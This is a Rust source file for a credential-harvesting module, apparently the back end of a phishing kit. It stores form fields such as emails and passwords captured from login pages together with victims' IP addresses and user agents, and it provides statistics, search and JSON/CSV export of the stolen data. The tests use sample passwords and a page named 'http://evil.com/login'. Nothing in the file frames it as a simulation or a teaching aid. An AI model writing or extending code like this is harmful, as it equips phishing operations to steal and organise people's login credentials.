use std::collections::HashMap;
use std::sync::Mutex;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct HarvestedCred {
    pub timestamp: String,
    pub source_ip: String,
    pub user_agent: String,
    pub form_data: HashMap<String, String>,
    pub page: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct HarvestStats {
    pub total_creds: usize,
    pub unique_ips: Vec<String>,
    pub by_page: HashMap<String, usize>,
    pub first_harvest: Option<String>,
    pub last_harvest: Option<String>,
}

pub struct CredHarvester {
    creds: Mutex<Vec<HarvestedCred>>,
}

impl Default for CredHarvester {
    fn default() -> Self {
        Self::new()
    }
}

impl CredHarvester {
    pub fn new() -> Self {
        CredHarvester {
            creds: Mutex::new(Vec::new()),
        }
    }

    pub fn capture(&self, source_ip: &str, user_agent: &str, form_data: HashMap<String, String>, page: &str) -> HarvestedCred {
        let cred = HarvestedCred {
            timestamp: chrono::Utc::now().to_rfc3339(),
            source_ip: source_ip.to_string(),
            user_agent: user_agent.to_string(),
            form_data,
            page: page.to_string(),
        };
        if let Ok(mut creds) = self.creds.lock() {
            creds.push(cred.clone());
        }
        cred
    }

    pub fn get_all(&self) -> Vec<HarvestedCred> {
        self.creds.lock().map(|c| c.clone()).unwrap_or_default()
    }

    pub fn stats(&self) -> HarvestStats {
        let creds = self.get_all();
        let total_creds = creds.len();
        let mut unique_ips: Vec<String> = creds.iter().map(|c| c.source_ip.clone()).collect();
        unique_ips.sort();
        unique_ips.dedup();

        let mut by_page: HashMap<String, usize> = HashMap::new();
        for cred in &creds {
            *by_page.entry(cred.page.clone()).or_default() += 1;
        }

        let first_harvest = creds.first().map(|c| c.timestamp.clone());
        let last_harvest = creds.last().map(|c| c.timestamp.clone());

        HarvestStats {
            total_creds,
            unique_ips,
            by_page,
            first_harvest,
            last_harvest,
        }
    }

    pub fn export_json(&self) -> String {
        let creds = self.get_all();
        serde_json::to_string_pretty(&creds).unwrap_or_default()
    }

    pub fn export_csv(&self) -> String {
        let creds = self.get_all();
        let mut csv = String::from("timestamp,source_ip,page,field,value\n");
        for cred in &creds {
            for (field, value) in &cred.form_data {
                csv.push_str(&format!("\"{}\",\"{}\",\"{}\",\"{}\",\"{}\"\n",
                    cred.timestamp, cred.source_ip, cred.page, field, value));
            }
        }
        csv
    }

    pub fn search(&self, keyword: &str) -> Vec<HarvestedCred> {
        let lower = keyword.to_lowercase();
        self.get_all().into_iter().filter(|c| {
            c.source_ip.to_lowercase().contains(&lower)
                || c.page.to_lowercase().contains(&lower)
                || c.form_data.values().any(|v| v.to_lowercase().contains(&lower))
                || c.form_data.keys().any(|k| k.to_lowercase().contains(&lower))
        }).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn test_capture() {
        let harvester = CredHarvester::new();
        let mut data = HashMap::new();
        data.insert("email".to_string(), "user@test.com".to_string());
        data.insert("password".to_string(), "secret123".to_string());

        let cred = harvester.capture("10.0.0.1", "Mozilla/5.0", data, "http://evil.com/login");
        assert_eq!(cred.source_ip, "10.0.0.1");
        assert_eq!(cred.form_data.get("email").unwrap(), "user@test.com");
    }

    #[test]
    fn test_stats() {
        let harvester = CredHarvester::new();
        let mut d1 = HashMap::new();
        d1.insert("user".to_string(), "alice".to_string());
        harvester.capture("10.0.0.1", "UA", d1, "/page1");

        let mut d2 = HashMap::new();
        d2.insert("user".to_string(), "bob".to_string());
        harvester.capture("10.0.0.2", "UA", d2, "/page1");

        let stats = harvester.stats();
        assert_eq!(stats.total_creds, 2);
        assert_eq!(stats.unique_ips.len(), 2);
    }

    #[test]
    fn test_export_json() {
        let harvester = CredHarvester::new();
        let mut data = HashMap::new();
        data.insert("email".to_string(), "test@test.com".to_string());
        harvester.capture("1.2.3.4", "UA", data, "/login");
        let json = harvester.export_json();
        assert!(json.contains("test@test.com"));
    }

    #[test]
    fn test_export_csv() {
        let harvester = CredHarvester::new();
        let mut data = HashMap::new();
        data.insert("user".to_string(), "alice".to_string());
        harvester.capture("1.2.3.4", "UA", data, "/");
        let csv = harvester.export_csv();
        assert!(csv.contains("alice"));
    }

    #[test]
    fn test_search() {
        let harvester = CredHarvester::new();
        let mut data = HashMap::new();
        data.insert("email".to_string(), "admin@corp.com".to_string());
        harvester.capture("10.0.0.1", "UA", data, "/admin");
        let results = harvester.search("admin");
        assert_eq!(results.len(), 1);
    }

    #[test]
    fn test_empty_stats() {
        let harvester = CredHarvester::new();
        let stats = harvester.stats();
        assert_eq!(stats.total_creds, 0);
    }

    #[test]
    fn test_harvest_cred_serialize() {
        let mut data = HashMap::new();
        data.insert("pass".to_string(), "secret".to_string());
        let cred = HarvestedCred {
            timestamp: "now".to_string(),
            source_ip: "10.0.0.1".to_string(),
            user_agent: "curl".to_string(),
            form_data: data,
            page: "/login".to_string(),
        };
        let json = serde_json::to_string_pretty(&cred).unwrap();
        assert!(json.contains("10.0.0.1"));
    }
}
